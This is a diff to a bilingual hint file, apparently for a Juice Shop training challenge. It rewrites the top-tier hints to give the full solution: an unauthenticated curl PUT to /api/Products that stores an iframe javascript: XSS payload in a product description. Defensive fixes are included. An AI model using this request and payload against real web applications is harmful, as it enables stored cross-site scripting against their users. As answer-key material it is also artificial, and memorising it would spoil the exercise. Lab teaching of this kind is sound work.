@@ -70,55 +70,55 @@ hints:
   N4:
     cost_pct: 35
     text_fr: |
-      Squelette du payload curl :
-      curl -X PUT http://127.0.0.1:3000/api/Products/<id>
-        -H "Authorization: Bearer <ton_jwt>"
-        -H "Content-Type: application/json"
-        -d '{"description":"<iframe src=\"javascript:alert(`xss`)\">"}'
-      L'id du produit peut etre n'importe lequel (1, 2, 3...). Le
-      serveur stocke le payload brut dans description. Apres
-      cela, naviguer sur la page produit declenche l'iframe.
+      L'angle est un PUT /api/Products/:id avec le payload dans le
+      champ description. Aucun jeton n'est requis : la ligne
+      d'autorisation sur le PUT produits est commentee (meme faille que
+      changeProductChallenge). Squelette :
+        curl -X PUT http://127.0.0.1:3000/api/Products/<id> \\
+          -H "Content-Type: application/json" \\
+          -d '{"description":"<iframe src=\\"javascript:alert(`xss`)\\">"}'
+      L'id peut etre n'importe lequel. Le serveur stocke le payload
+      brut ; la page produit l'affiche ensuite via [innerHTML].
     text_en: |
-      curl payload skeleton:
-      curl -X PUT http://127.0.0.1:3000/api/Products/<id>
-        -H "Authorization: Bearer <your_jwt>"
-        -H "Content-Type: application/json"
-        -d '{"description":"<iframe src=\"javascript:alert(`xss`)\">"}'
-      Product id can be anything (1, 2, 3...). Server stores
-      payload raw in description. After that, browsing the
-      product page triggers the iframe.
+      The angle is a PUT /api/Products/:id with the payload in the
+      description field. No token is required: the authorization line
+      on the products PUT is commented out (same flaw as
+      changeProductChallenge). Skeleton:
+        curl -X PUT http://127.0.0.1:3000/api/Products/<id> \\
+          -H "Content-Type: application/json" \\
+          -d '{"description":"<iframe src=\\"javascript:alert(`xss`)\\">"}'
+      The id can be any. The server stores the raw payload; the product
+      page then shows it via [innerHTML].
     pedagogical_intent: |
-      Spell the exact curl with payload.
+      Give the exact request and correct the (absent) auth requirement.
 
   N5:
     cost_pct: 50
     text_fr: |
-      Workflow complet :
-      1. Login pour obtenir un JWT (curl POST /rest/user/login).
-      2. PUT /api/Products/1 avec le payload exact :
-         curl -X PUT http://127.0.0.1:3000/api/Products/1
-           -H "Authorization: Bearer <jwt>"
-           -H "Content-Type: application/json"
-           -d '{"description":"<iframe src=\"javascript:alert(`xss`)\">"}'
-      3. Navigue sur /#/search ou recherche le produit modifie.
-      4. L'iframe execute, alert apparait, challenge se valide.
-      Source officielle : codefixes/restfulXssChallenge.info.yml
-      fix #1 (correct) explique le bug racine : access control
-      manquant.
-      Defense : (1) restreindre PUT/PATCH /api/Products au role admin authentifie uniquement (codefixes fix #1 — access control manquant). (2) Sanitiser les descriptions de produits avec DOMPurify avant rendu. (3) Appliquer une CSP stricte bloquant les iframes et les URI javascript:.
+      Solution (verifiee en recette sur Juice Shop 19.2.1, sans
+      authentification) :
+        curl -s -X PUT http://127.0.0.1:3000/api/Products/3 \\
+          -H "Content-Type: application/json" \\
+          -d '{"description":"<iframe src=\\"javascript:alert(`xss`)\\">"}'
+      Reponse 200, challenge resolu : le setter de description du
+      modele Product detecte le payload exact. Ensuite, afficher ce
+      produit execute l'iframe.
+      Defense : exposer les operations d'ecriture produits uniquement
+      a un role admin authentifie, et nettoyer/echapper la description
+      cote serveur avant stockage et avant affichage (ne pas utiliser
+      [innerHTML] sur un contenu non echappe).
     text_en: |
-      Complete workflow:
-      1. Login to get a JWT (curl POST /rest/user/login).
-      2. PUT /api/Products/1 with exact payload:
-         curl -X PUT http://127.0.0.1:3000/api/Products/1
-           -H "Authorization: Bearer <jwt>"
-           -H "Content-Type: application/json"
-           -d '{"description":"<iframe src=\"javascript:alert(`xss`)\">"}'
-      3. Browse to /#/search or look up the modified product.
-      4. Iframe executes, alert appears, challenge solves.
-      Official source: codefixes/restfulXssChallenge.info.yml
-      fix #1 (correct) explains the root: missing access
-      control.
-      Defense: (1) restrict PUT/PATCH /api/Products to admin-authenticated role only (codefixes fix #1 — missing access control). (2) Sanitize product descriptions via DOMPurify before rendering. (3) Apply strict CSP blocking inline iframes and javascript: URIs.
+      Solution (verified during testing on Juice Shop 19.2.1, no
+      authentication):
+        curl -s -X PUT http://127.0.0.1:3000/api/Products/3 \\
+          -H "Content-Type: application/json" \\
+          -d '{"description":"<iframe src=\\"javascript:alert(`xss`)\\">"}'
+      Response 200, challenge solved: the Product model's description
+      setter detects the exact payload. Then displaying that product
+      runs the iframe.
+      Defense: expose product write operations only to an authenticated
+      admin role, and sanitize/escape the description server-side before
+      storing and before display (do not use [innerHTML] on unescaped
+      content).
     pedagogical_intent: |
-      Quasi-solution : full 4-step workflow with source citation.
+      Full solution: verified no-auth request, defense.
